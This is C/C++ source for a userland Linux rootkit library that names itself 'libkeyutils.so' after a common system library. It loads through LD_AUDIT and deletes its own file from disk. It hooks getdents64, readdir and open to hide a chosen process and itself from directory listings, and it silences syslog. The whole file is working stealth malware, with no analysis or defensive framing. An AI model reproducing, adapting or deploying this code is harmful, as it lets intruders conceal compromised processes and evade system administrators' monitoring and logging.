#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <syslog.h>
#include <stdarg.h>
#include <link.h>
#include <errno.h>

static char* target_process_name = NULL;
static char artifact_path[PATH_MAX] = {0};
static const char* artifact_name = "libkeyutils.so";

typedef struct dirent* (*readdir_t)(DIR*);
typedef struct dirent64* (*readdir64_t)(DIR*);
typedef int (*open_t)(const char*, int, ...);
typedef int (*openat_t)(int, const char*, int, ...);
typedef ssize_t (*getdents64_t)(int, void*, size_t);

static readdir_t real_readdir = NULL;
static readdir64_t real_readdir64 = NULL;
static open_t real_open = NULL;
static openat_t real_openat = NULL;
static getdents64_t real_getdents64 = NULL;

extern "C" unsigned int la_version(unsigned int version) { return version; }
extern "C" void openlog(const char *ident, int option, int facility) { }
extern "C" void syslog(int priority, const char *format, ...) { }
extern "C" void vsyslog(int priority, const char *format, va_list ap) { }

__attribute__((constructor))
static void audit_init() {
    if (getenv("_AUDIT_BRIDGE_LOCK")) return;
    Dl_info info;
    if (dladdr((void*)audit_init, &info)) strncpy(artifact_path, info.dli_fname, PATH_MAX - 1);
    char* is_audit = getenv("LD_AUDIT");
    if (is_audit && strstr(is_audit, artifact_name)) {
        setenv("_AUDIT_BRIDGE_LOCK", "1", 1);
        unsetenv("LD_AUDIT");
        dlopen(artifact_path, RTLD_NOW | RTLD_GLOBAL);
        if (artifact_path[0] != '\0') unlink(artifact_path);
        return;
    }
    setenv("_AUDIT_BRIDGE_LOCK", "1", 1);
    char* env_target = getenv("GCONF_PATH");
    if (env_target) { target_process_name = strdup(env_target); unsetenv("GCONF_PATH"); }
    if (artifact_path[0] != '\0') unlink(artifact_path);
    real_readdir = (readdir_t)dlsym(RTLD_NEXT, "readdir");
    real_readdir64 = (readdir64_t)dlsym(RTLD_NEXT, "readdir64");
    real_open = (open_t)dlsym(RTLD_NEXT, "open");
    real_openat = (openat_t)dlsym(RTLD_NEXT, "openat");
    real_getdents64 = (getdents64_t)dlsym(RTLD_NEXT, "getdents64");
}

extern "C" ssize_t getdents64(int fd, void *dirp, size_t count) {
    if (!real_getdents64) real_getdents64 = (getdents64_t)dlsym(RTLD_NEXT, "getdents64");
    ssize_t ret = real_getdents64(fd, dirp, count);
    if (ret <= 0) return ret;
    ssize_t pos = 0;
    while (pos < ret) {
        struct dirent64* entry = (struct dirent64*)((char*)dirp + pos);
        if ((target_process_name && strcmp(entry->d_name, target_process_name) == 0) || (strcmp(entry->d_name, artifact_name) == 0)) {
            unsigned short sz = entry->d_reclen;
            memmove((char*)dirp + pos, (char*)dirp + pos + sz, ret - pos - sz);
            ret -= sz;
        } else pos += entry->d_reclen;
    }
    return ret;
}

extern "C" struct dirent* readdir(DIR* d) {
    if (!real_readdir) real_readdir = (readdir_t)dlsym(RTLD_NEXT, "readdir");
    struct dirent* e;
    while ((e = real_readdir(d)) != NULL) {
        if ((target_process_name && strcmp(e->d_name, target_process_name) == 0) || (strcmp(e->d_name, artifact_name) == 0)) continue;
        break;
    }
    return e;
}

extern "C" int open(const char* p, int f, ...) {
    if (p && strstr(p, artifact_name)) { errno = ENOENT; return -1; }
    if (!real_open) real_open = (open_t)dlsym(RTLD_NEXT, "open");
    va_list a; va_start(a, f); mode_t m = va_arg(a, mode_t); va_end(a);
    return real_open(p, f, m);
}
